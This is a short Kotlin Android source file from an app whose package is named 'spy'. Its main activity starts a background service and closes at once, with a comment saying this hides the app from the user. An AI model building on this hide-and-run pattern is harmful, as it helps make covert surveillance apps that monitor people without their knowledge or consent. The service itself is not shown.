package com.gauravhanna.spy

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Start background service
        startService(Intent(this, BackgroundService::class.java))
        // Immediately finish (hide the app)
        finish()
    }
}